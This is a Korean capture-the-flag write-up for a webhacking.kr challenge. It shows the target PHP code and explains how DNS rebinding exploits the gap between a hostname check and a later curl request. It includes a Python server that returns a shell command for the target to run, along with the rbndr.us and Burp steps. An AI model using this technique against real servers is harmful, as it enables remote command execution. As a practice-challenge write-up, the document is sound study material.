---
title: ["[Webhacking.kr] child toctou🚲 (race condition - 200)"]
date: 2024-12-01 09:00:00 +0900
categories: [writeup, webhacking.kr]
tags: [web, race condition, toctou, DNS Rebinding]
---

```php
<?php
  // system($_GET['q']);
  $cmd = $_GET['q'];
  if($cmd){
    if(count(explode(":",$_SERVER['HTTP_HOST'])) > 1) $_SERVER['HTTP_HOST'] = explode(":",$_SERVER['HTTP_HOST'])[0];
    if(!preg_match("/^[a-z0-9-.]+$/",$_SERVER['HTTP_HOST'])) exit("ahh nice try");
    if(($_SERVER['HTTP_HOST'] !== "webhacking.kr") && (gethostbyname($_SERVER['HTTP_HOST']) !== "202.182.106.159")) exit("Something wrong");
    sleep(1); // my server is small and weak
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://{$_SERVER['HTTP_HOST']}:10020/cmd/".rawurlencode($cmd).".txt");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 4);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    if(curl_getinfo($ch, CURLINFO_HTTP_CODE) !== 200){
      echo <<<HELP
      only "ls", "cat api.php", "cat index.php" allowed
      HELP;
    }
    else{ system($response); }
    curl_close($ch);
  }
?>
```

이번 문제는 호스트를 체크한다.  
* HTTP_HOST가 "webhacking.kr" 이거나
* HTTP_HOST의 IP가 "202.182.106.159" 이어야 한다.  
  
그 후 1초 대기하고, 입력받은 명령어를 `.txt` 확장자로 붙여서 `curl`로 요청한다.  
만약 curl 응답이 200이면, `system()`함수로 실행한다.  

호스트를 체크할 때의 시점과 실제 `curl` 요청할 때의 시점 사이의 차이를 이용할 수 있겠다.  


이번 문제는 DNS Rebinding 공격을 사용할 수 있다.  
DNS Rebinding 공격은 DNS 응답을 조작해서 서버의 보안을 우회하는 공격이다.  

서버에서 `gethostbyname()`으로 호스트 이름을 확인하고, 1초 후에 curl로 해당 호스트에 요청을 보낸다.  
이 사이에 DNS 응답을 바꾸면, 필터링을 통과하고 우리가 원하는 다른 서버 주소로 데이터를 수신할 수 있다.  


먼저, AWS나 GCP와 같은 서버가 하나 필요하다.  
로컬호스트에 ngrok을 사용해서도 가능한데 설정이 상당히 번거롭다.  

서버에 `server.py`를 만들어 파이썬으로 실행한다.  
```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"cat flag.php")

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 10020), Handler)
    print("Server started at port 10020")
    server.serve_forever()
```

```
$ curl "http://[MY_SERVER_IP]:10020/cmd/ls.txt"
cat flag.php
```  
문제 서버에서는 `~.txt`로 curl 요청을 보내는데, 어떤 경로로 요청을 보내도 `cat flag.php`라는 응답을 하도록 서버를 세팅했다.  

DNS Rebinding 기법은 별도의 DNS 서버를 세팅할 필요 없이 [오픈소스](https://github.com/taviso/rbndr)를 사용하면 된다.  

`<IPv4 by HEX>.<IPv4 by HEX>.rbndr.us`와 같이 설정하면 되고, IP의 순서는 상관 없다.  
`rbndr.us`는 TTL을 1초 이하로 매우 짧게 설정하여, 응답하는 IP 주소가 번갈아가며 나오게 된다.  

하지만, 공개 DNS 서버나 로컬 DNS 리졸버에 의해 TTL 값이 수정되고, 이전의 응답이 캐싱될 수 있다.  
따라서, 로컬에서 테스트할 때는 IP가 번갈아 가며 나오지 않을 확률이 높다.  

온라인으로 DNS TRACE를 테스트하는 서비스들이 많이 있는데,  
해당 서비스를 사용하면 서로 다른 응답이 나오는 것을 확인할 수 있다.  

burp로 `http://webhacking.kr:10020/api.php?q=ls` request를 intercept해서 Host를 `[MY_SERVER_IP].cab66a9f.rbndr.us`로 바꿔주고 요청을 날리면 확률적으로 flag가 나온다.  
